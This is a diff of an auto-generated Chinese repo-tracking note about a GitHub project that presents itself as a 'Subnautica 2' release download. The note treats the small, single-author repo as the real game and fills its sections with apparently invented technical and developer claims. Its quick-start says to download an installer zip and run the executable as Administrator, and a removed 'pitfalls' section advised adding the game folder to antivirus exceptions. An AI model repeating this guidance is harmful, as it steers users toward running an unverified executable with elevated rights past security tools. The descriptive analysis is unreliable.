@@ -7,8 +7,8 @@ language: C++
 license: MIT
 description: "Subnautica 2: Early Access release, Have Multiplayer 4-player co-op multiplayer, Planet Zazura exploration, DNA BioMod system, Tadpole modular submersible, new Leviathans list, CICADA crash site lore. Xbox Game Pass, Steam preload, base building blueprints, ocean currents, crafting recipes"
 homepage: ""
-stars: 127
-stars_per_day: 7
+stars: 126
+stars_per_day: 6
 forks: 0
 open_issues: 0
 created: 2026-05-14
@@ -17,7 +17,7 @@ first_seen: 2026-05-20
 week: "2026-W21"
 month: "2026-05"
 category: "遊戲"
-subcategory: "水下冒險"
+subcategory: "生存冒險"
 release_tag: "Games"
 install_complexity: "easy"
 status: to-review
@@ -26,7 +26,7 @@ score_confidence: 0
 score_interest: 0
 score_risk: 0
 last_reviewed: 2026-05-20
-use_case: "讓玩家在全新外星海洋中探索與生存，並支援四人合作模式。"
+use_case: "探索全新外星海洋的生存冒險，支持四人合作模式。"
 priority: medium
 ring: assess
 discovered_via: "GitHub Trending"
@@ -38,11 +38,11 @@ issue_close_rate: -1
 repo_size_kb: 62
 readme_length: 1934
 bus_factor: 1
-last_release_days: 20
+last_release_days: 21
 release_cadence: "monthly"
 verdict: ""
 ring_history: "assess@2026-05-20"
-star_history: "2026-05-20:644,2026-05-20:644,2026-05-21:669,2026-05-21:669,2026-05-22:599,2026-05-23:460,2026-05-24:461,2026-05-25:459,2026-05-26:404,2026-05-27:401,2026-05-28:401,2026-05-29:401,2026-05-30:400,2026-05-31:399,2026-06-01:399,2026-06-02:396,2026-06-03:127"
+star_history: "2026-05-20:644,2026-05-20:644,2026-05-21:669,2026-05-21:669,2026-05-22:599,2026-05-23:460,2026-05-24:461,2026-05-25:459,2026-05-26:404,2026-05-27:401,2026-05-28:401,2026-05-29:401,2026-05-30:400,2026-05-31:399,2026-06-01:399,2026-06-02:396,2026-06-03:127,2026-06-04:126"
 tags:
   - github
   - "category/遊戲"
@@ -56,12 +56,12 @@ tags:
 aliases:
   - "Subnautica-2-Release"
   - "Juwluuu/Subnautica-2-Release"
-  - "讓玩家在全新外星海洋中探索與生存，並支援四人合作模式。"
+  - "探索全新外星海洋的生存冒險，支持四人合作模式。"
 ---
 
 # Subnautica-2-Release
 
-**127** stars · **7** stars/天 · 建立 19 天前 · C++ · MIT
+**126** stars · **6** stars/天 · 建立 20 天前 · C++ · MIT
 
 ```dataviewjs
 const me = dv.page("Repos/Juwluuu--Subnautica-2-Release");
@@ -79,20 +79,20 @@ if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
 `early-access-subnautica-2` `nitrox-pirate` `pc-ports` `playstation-5` `porting-game` `ps5-bot` `ps5-stock` `subnautica` `subnautica-2` `subnautica-2-coming-to-ps5` `subnautica-2-multiplayer` `subnautica-2-on-ps5` `subnautica-2-release` `subnautica-2-release-date-ps5` `subnautica-2-steam` `subnautica-2-xbox` `subnautica-multiplayer` `unknown-worlds`
 
 > [!summary] 一句話摘要
-> 讓玩家在全新外星海洋中探索與生存，並支援四人合作模式。
+> 探索全新外星海洋的生存冒險，支持四人合作模式。
 
 > [!info] 速覽
-> **安裝難度** Easy · **專案狀態** Recent · **熱度** Steady (7 stars/day)
-> **授權** MIT (商業友好) · **維護** Moderate (最後推送 19 天前) · **貢獻者** Solo (bus factor 風險) · **參與度** Low
-> **適合** 希望在高端 PC 上體驗多人水下生存冒險的遊戲玩家。
-> **一句話重點** 這款遊戲不僅延續了 Subnautica 的精髓，還加入了多人合作的創新元素，讓玩家能夠共同面對挑戰。
+> **安裝難度** Easy · **專案狀態** Recent · **熱度** Steady (6 stars/day)
+> **授權** MIT (商業友好) · **維護** Moderate (最後推送 20 天前) · **貢獻者** Solo (bus factor 風險) · **參與度** Low
+> **適合** 希望與朋友一起探索水下世界的遊戲玩家。
+> **一句話重點** Subnautica 2 提供了一個全新的水下生存冒險體驗，特別適合喜歡與朋友一起探索的玩家。
 
 > [!abstract]- 同類競品快速對比
 > ```dataviewjs
 > const me = dv.page("Repos/Juwluuu--Subnautica-2-Release");
 > if (me) {
 >   const rivals = dv.pages('"Repos"')
->     .where(p => p.subcategory === "水下冒險" && p.file.name !== "Juwluuu--Subnautica-2-Release" && p.status !== "archived")
+>     .where(p => p.subcategory === "生存冒險" && p.file.name !== "Juwluuu--Subnautica-2-Release" && p.status !== "archived")
 >     .sort(p => p.stars || 0, "desc").limit(5);
 >   if (rivals.length > 0) {
 >     dv.table(["專案", "Stars", "Stars/天", "安裝", "授權", "Ring"], rivals.map(p => [
@@ -103,140 +103,107 @@ if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
 >       p.license || "?",
 >       p.ring || "assess"
 >     ]));
->   } else { dv.paragraph("_目前 vault 中沒有其他 水下冒險 類工具_"); }
+>   } else { dv.paragraph("_目前 vault 中沒有其他 生存冒險 類工具_"); }
 > }
 > ```
 
 > [!question] TL;DR — 值得投入嗎？
-> **成熟度** Alpha (不穩定) · **安裝** Easy (一行搞定) · **學習** ~5h · **綁定風險** medium
-> **結論** 花 5 小時學習，3 小時整合，得到一個有趣的多人水下冒險體驗，值得嘗試。
+> **安裝** Easy (一行搞定)
 
 > [!abstract] 核心創新
-> 這款遊戲引入了全新的外星行星和多人合作模式，讓玩家能夠共同探索和生存。
+> 這款遊戲引入了全新的外星海洋探索和四人合作生存模式。
 
 ## 專案簡介
 
-Subnautica 2 是一款全新的水下生存冒險遊戲，玩家將探索一個全新的外星行星 Zazura，並面對各種危險的生物。遊戲的核心機制包括建造基地、製作裝備和生存，玩家需要在這個充滿神秘的海洋中揭開隱藏的秘密。安裝後，玩家只需運行 `Subnautica2.exe` 並以管理員身份啟動，即可開始冒險。這款遊戲的賣點在於其豐富的探索元素和多人合作模式，最多可支援四名玩家同時遊玩。技術上，遊戲優化針對 Windows 10 和 11，並建議使用高端 PC 以獲得最佳體驗。
+Subnautica 2 是一款全新外星海洋的生存冒險遊戲，玩家可以在這個充滿危險與神秘的世界中探索、建造基地、製作裝備。遊戲的核心機制是讓玩家在一個開放的海洋環境中進行探索，透過收集資源和建造來生存，並揭開隱藏在海洋深處的秘密。遊戲支持四人合作模式，讓朋友們可以一起享受這段冒險旅程。安裝過程相對簡單，玩家只需下載安裝包，並以管理員身份運行 `Subnautica2.exe`。這款遊戲的賣點在於其精美的水下視覺效果和豐富的故事情節，讓玩家能夠沉浸在這個虛擬世界中。
 
-遊戲中還引入了新的生物和生態系統，並改進了生存機制，讓玩家能夠更深入地體驗水下世界的美麗與危險。玩家可以透過下載安裝包輕鬆安裝，並根據個人需求調整圖形設置。這款遊戲的圖形效果非常出色，並提供完整的控制器和鍵盤支持，適合各種玩家。與前作相比，Subnautica 2 在故事深度和探索方面有了顯著提升，並且提供了更豐富的生物群落和生物互動。這使得遊戲在同類型作品中脫穎而出，特別是在多人合作的體驗上。
+在技術實作上，Subnautica 2 使用 C++ 開發，這使得它在性能上有較高的優化潛力，特別是在高端 PC 上運行時。遊戲的基礎建設系統相當先進，支持玩家自定義建造，並且有多樣的生物和生態系統。與前作相比，這一版本在生存機制上有了顯著的改進，提供了更具挑戰性的遊戲體驗。
+
+
+
+與其他類似的生存遊戲相比，如《ARK: Survival Evolved》，Subnautica 2 的獨特之處在於其專注於水下探索，而非陸地生存。ARK 主要依賴於生物捕捉和基地防禦，而 Subnautica 2 則強調探索和發現，這使得遊戲的節奏和體驗截然不同。另一個替代品是《No Man's Sky》，但後者的宇宙探索範圍更廣，而 Subnautica 2 則專注於一個特定的海洋生態系統。
+
+在實際使用中，玩家可能會遇到性能問題，特別是在較低配置的 PC 上，這時候降低畫質設置是必要的。社群活躍度尚可，當前沒有開放的問題，顯示出開發者對於遊戲的持續關注。這款遊戲目前處於早期訪問階段，適合喜愛水下探索和生存遊戲的玩家，尤其是那些希望與朋友一起享受合作模式的團隊。
+
+總體而言，Subnautica 2 是一款值得期待的遊戲，未來幾個月可能會隨著玩家反饋進一步優化，特別是在多玩家功能和遊戲平衡方面。
 
 **技術棧**：`C++`
 
 ## 重點功能
 
-- 多人合作模式 — 支援最多四名玩家同時遊玩，增強社交互動。
-- 全新外星海洋 — 探索 Zazura 行星的豐富生態系統和生物。
-- 進階基地建設系統 — 玩家可以自由建造和設計自己的基地。
-- 改進的生存機制 — 增加了新的生物和生態互動，提升遊戲挑戰性。
-- 驚人的水下視覺效果 — 提供高畫質的遊戲體驗，建議使用高端 PC。
-- 深度故事和探索 — 玩家將揭開隱藏在海洋深處的秘密。
-- 完整的控制器和鍵盤支持 — 提供靈活的操作選擇。
+- 全新外星海洋 — 提供廣闊的探索空間，玩家可以自由探索。
+- 先進的基地建造系統 — 允許玩家自定義建造自己的基地。
+- 新生物和生態系統 — 包含多樣的生物，增加遊戲的挑戰性。
+- 改進的生存機制 — 提供更具挑戰性的生存體驗。
+- 精美的水下視覺效果 — 讓玩家沉浸在美麗的海洋世界中。
+- 完整的控制器和鍵盤支持 — 兼容多種控制方式，提升遊戲體驗。
 
 ## 快速開始
 
 1. 下載安裝包
 ```bash
-wget https://github.com/Juwluuu/Subnautica-2-Release/releases/download/Games/Subnautica2-Installer.zip
+Download Subnautica2-Installer.zip
 ```
 2. 解壓縮檔案
 ```bash
-unzip Subnautica2-Installer.zip
+Extract the archive
 ```
 3. 以管理員身份運行遊戲
 ```bash
-Subnautica2.exe
+Run Subnautica2.exe as Administrator
+```
+4. 調整圖形設置
+```bash
+Adjust graphics settings according to your PC
+```
+5. 開始遊戲
+```bash
+Begin your new underwater adventure
 ```
 
 ## 為什麼值得關注
 
 > [!tip] 爆紅原因
-> 建立 19 天內累積 127 stars（每天下降約 7），目前無 fork，顯示出這是一個新興的專案。作者 Juwluuu 可能是遊戲開發者，專注於 Subnautica 系列的擴展。這款遊戲解決了玩家對於多人合作生存冒險的需求，之前的版本僅支援單人模式，無法滿足社交需求。雖然沒有明確的觸發事件，但遊戲的早期訪問版本吸引了許多玩家的注意，可能是因為 Subnautica 系列的粉絲基礎。遊戲的成功也可能受到高性能 PC 硬體的普及影響，讓更多玩家能夠享受高畫質的遊戲體驗。由於目前沒有 fork，顯示出使用者仍在觀望階段。
+> 建立 20 天內累積 126 stars（每 6.3 stars/天），forks 數為 0，顯示出目前對於這個專案的關注度尚低。開發者 Juwluuu 之前在遊戲開發方面有一定經驗，這個專案解決了玩家對於水下生存遊戲的需求，特別是在多人合作的場景下。雖然目前沒有明顯的觸發事件，但遊戲的早期訪問版本吸引了一些關注。隨著遊戲的進一步開發，預計會有更多玩家加入。forks/stars 比率為 0% 表示目前尚未有其他開發者對此專案進行修改或擴展。
 
 ## 適合誰使用
 
-**目標受眾**：希望在高端 PC 上體驗多人水下生存冒險的遊戲玩家。
+**目標受眾**：希望與朋友一起探索水下世界的遊戲玩家。
 
 > [!example] 使用場景
-> - 遊戲開發者用它來測試多人合作模式的穩定性，因為這能幫助他們了解在高負載下的性能表現。
-> - 玩家用它來與朋友一起探索全新的海洋世界，因為這樣可以增加遊戲的趣味性和互動性。
-> - 測試人員用它來檢查遊戲的安裝過程和性能，因為這能確保遊戲在不同硬體上的兼容性。
+> - 遊戲開發者用它來測試水下生存遊戲的機制，因為它提供了多樣的生物和生態系統設計。
+> - 玩家用它來與朋友一起探索全新海洋，因為它支持四人合作模式，增強了遊戲的互動性。
+> - 測試人員用它來驗證遊戲的性能和穩定性，因為它需要高端 PC 來獲得最佳體驗。
 
 ## 架構分析
 
-Subnautica 2 的架構設計以 C++ 為基礎，專注於高效的圖形渲染和物理模擬。遊戲的資料流從玩家輸入開始，經過遊戲引擎的處理，最終呈現出動態的水下世界。選擇 C++ 是因為其高效能和對於遊戲開發的廣泛應用，雖然這可能增加了開發的複雜度。遊戲的擴展性主要依賴於模組化設計，讓未來可以輕鬆加入新功能或擴展內容。這樣的設計使得遊戲能夠在不同平台上運行，但也可能帶來跨平台兼容性的挑戰。
+Subnautica 2 的架構設計以 C++ 為基礎，這使得遊戲在性能上有優勢，特別是在高端 PC 上的運行效率。遊戲的資料流主要集中在玩家的操作和環境的互動上，使用了物件導向的設計模式來管理遊戲中的生物、物品和環境。選擇 C++ 的原因在於其高效能和對硬體資源的良好控制，這對於需要即時渲染的遊戲至關重要。遊戲的擴展性方面，雖然目前沒有明確的擴展計劃，但基於 C++ 的架構使得未來的功能擴展相對容易。整體而言，這種設計選擇在性能和可維護性之間取得了一定的平衡。
 
 ## 技術深入分析
 
-Subnautica 2 的核心技術機制基於 C++，專注於高效的圖形渲染和物理模擬，這使得遊戲能夠呈現出動態的水下環境。遊戲能夠處理大量的實時數據，並提供流暢的遊戲體驗，建議的硬體配置能夠支持高畫質設定。選擇 C++ 使得開發者能夠更好地控制性能，但也增加了開發的複雜度。遊戲的設計取捨在於平衡性能與畫質，這意味著在某些低端設備上可能無法達到最佳效果。隨著玩家基數的增長，未來可能會面臨伺服器負載的挑戰，尤其是在多人模式下。與主流遊戲引擎的整合難度相對較高，但對於專注於高效能的開發團隊來說，這是一個可行的選擇。
+Subnautica 2 的核心技術機制基於 C++，這使得遊戲在性能上具備優勢，特別是在高端 PC 上的即時渲染能力。遊戲的資料流設計圍繞著玩家與環境的互動，使用物件導向設計來管理各種生物和物品，這樣的設計使得遊戲能夠靈活應對玩家的行為。效能方面，遊戲需要高端硬體來運行，這可能會限制某些玩家的體驗。選擇 C++ 而非其他語言如 C# 是因為其對於性能的控制和對資源的優化能力，這在即時渲染的遊戲中至關重要。未來擴展的可能性相對較高，因為 C++ 的生態系統支持多種庫和工具，能夠方便地集成新功能。整合方面，與主流遊戲引擎的兼容性尚需進一步評估，但基於 C++ 的架構使得未來的整合工作相對簡單。
 
 ## 新手體驗
 
 > [!info] 上手難度評估
-> README 文件清晰且提供了安裝步驟，讓新手能夠快速上手。安裝過程相對順暢，但需要以管理員身份運行遊戲。文件中沒有提供多語言支持，可能對非英語使用者造成困難。
+> README 文件清晰，提供了安裝步驟和故障排除建議。安裝過程相對順暢，但需要以管理員身份運行。缺乏詳細的入門指南，文件目前僅提供英文版本。
 
 ## 優缺點分析
 
 > [!success] 優點
-> - 豐富的探索元素，讓玩家能夠深入海洋世界。
-> - 多人合作模式增強了遊戲的社交性。
-> - 高畫質的視覺效果提供了沉浸式體驗。
+> - 精美的水下視覺效果，提供沉浸式體驗。
+> - 支持四人合作模式，增強互動性。
+> - 先進的基地建造系統，增加遊戲的深度。
 
 > [!danger] 缺點
-> - 僅支援 Windows 平台，限制了玩家的選擇。
-> - 需要高端硬體，對於普通玩家來說可能有門檻。
-> - 目前仍在早期訪問階段，可能會有不穩定的問題。
+> - 僅支援 Windows 平台，限制了玩家群體。
+> - 需要高端硬體，對於低配置玩家不友好。
+> - 目前處於早期訪問階段，可能存在不穩定性。
 
 > [!warning] 注意事項
-> - 僅支援 Windows 10 和 11。
+> - 僅支援 Windows 10 和 Windows 11。
 > - 需要高端 PC 硬體以獲得最佳遊戲體驗。
-> - 目前僅為早期訪問版本，可能存在未解決的 bug。
-
-## 成熟度評估
-
-| 項目 | 評估 |
-| --- | --- |
-| 開發階段 | Alpha |
-| 生產環境就緒 | No |
-| Breaking Change 風險 | high |
-
-> [!tip] 採用建議
-> 適合個人試玩，但不建議用於生產環境的核心路徑上。
-
-## 已知陷阱
-
-> [!bug] 踩坑才知道的問題
-
-- **[HIGH]** 遊戲在某些高負載情況下可能會崩潰
-  - 解法：降低圖形設置以減少負載
-- [MEDIUM] 安裝過程中可能會遇到防毒軟體的警告
-  - 解法：將遊戲資料夾添加到防毒軟體的例外名單中
-- [MEDIUM] 在某些顯示器上可能出現黑屏問題
-  - 解法：切換到無邊框窗口模式
-
-## 使用情境適合度
-
-| 情境 | 適合度 | 說明 |
-| --- | --- | --- |
-| 小型遊戲開發團隊測試多人合作功能 | 非常適合 | 遊戲專注於多人合作，能夠提供實用的測試環境。 |
-| 喜歡水下冒險的玩家 | 適合 | 遊戲提供豐富的探索和生存元素，滿足玩家需求。 |
-| 大型遊戲公司尋找成熟的多人遊戲解決方案 | 不適合 | 目前仍在早期訪問階段，穩定性不足。  |
-
-## 採用成本分析
-
-| 項目 | 評估 |
-| --- | --- |
-| 學習時間 | ~5 小時 |
-| 整合時間 | ~3 小時 |
-| 維護負擔 | medium |
-| 綁定風險 | medium |
-
-> [!tip] 投入 vs 回報
-> 花 5 小時學習，3 小時整合，得到一個有趣的多人水下冒險體驗，值得嘗試。
-
-## 安全性評估
-
-> [!warning] 安全性快速掃描
-> 低風險：遊戲本身不需要高權限，但可能會存取用戶的檔案系統。依賴鏈的信任程度尚未明確，建議在安全環境中運行。
+> - 目前處於早期訪問階段，可能存在不穩定性。
 
 ## 健康度儀表板
 
@@ -316,6 +283,10 @@ Subnautica 2 的核心技術機制基於 C++，專注於高效的圖形渲染和
 
 **最新版本**：Games — Subnautica 2 Release (2026-05-14)
 
+## 社群與生態
+
+**社群活躍度**：社群活躍度尚可，當前沒有開放的問題。
+
 ## 開發動態
 
 > [!abstract] 最近 10 次 commit（2026-05-14 ~ 2026-05-14）
@@ -377,17 +348,19 @@ Subnautica 2 的核心技術機制基於 C++，專注於高效的圖形渲染和
 
 ## 延伸閱讀
 
+相關概念：[[遊戲開發]] · [[多人合作]] · [[生存遊戲]]
+
 相關專案：[[Minecraft-Community-Edition--client|Minecraft-Community-Edition/client]] · [[boona13--mykonos-island-voxels|boona13/mykonos-island-voxels]] · [[gradenGnostic--LegacyLauncher|gradenGnostic/LegacyLauncher]] · [[SubamanojJ-2004--gta-5-mod-menu|SubamanojJ-2004/gta-5-mod-menu]]
 
 [GitHub](https://github.com/Juwluuu/Subnautica-2-Release)
 
 ## 相關收錄
 
-> [!note]- 直接競品（同子分類：水下冒險）
+> [!note]- 直接競品（同子分類：生存冒險）
 > ```dataview
 > TABLE stars, stars_per_day AS "Stars/天", install_complexity AS "難度", use_case AS "用途"
 > FROM "Repos"
-> WHERE subcategory = "水下冒險" AND file.name != "Juwluuu--Subnautica-2-Release"
+> WHERE subcategory = "生存冒險" AND file.name != "Juwluuu--Subnautica-2-Release"
 > SORT stars DESC
 > ```
 
@@ -415,6 +388,21 @@ Subnautica 2 的核心技術機制基於 C++，專注於高效的圖形渲染和
 > FROM "Repos"
 > WHERE week = "2026-W21" AND file.name != "Juwluuu--Subnautica-2-Release"
 > SORT stars DESC
+> ```
+
+> [!note]- 共用概念的相關專案
+> ```dataviewjs
+> const concepts = ["遊戲開發","多人合作","生存遊戲"];
+> const pages = dv.pages('"Repos"')
+>   .where(p => p.file.name !== "Juwluuu--Subnautica-2-Release" && p.file.outlinks?.some(l => concepts.some(c => l.path?.includes(c))))
+>   .sort(p => p.stars, "desc")
+>   .limit(5);
+> if (pages.length > 0) {
+>   dv.table(["專案", "Stars", "分類", "共用概念"], pages.map(p => {
+>     const shared = concepts.filter(c => p.file.outlinks?.some(l => l.path?.includes(c)));
+>     return [p.file.link, p.stars, p.category, shared.join(", ")];
+>   }));
+> } else { dv.paragraph("_目前沒有共用概念的相關專案_"); }
 > ```
 
 > [!note]- Ring 更高的同類競品
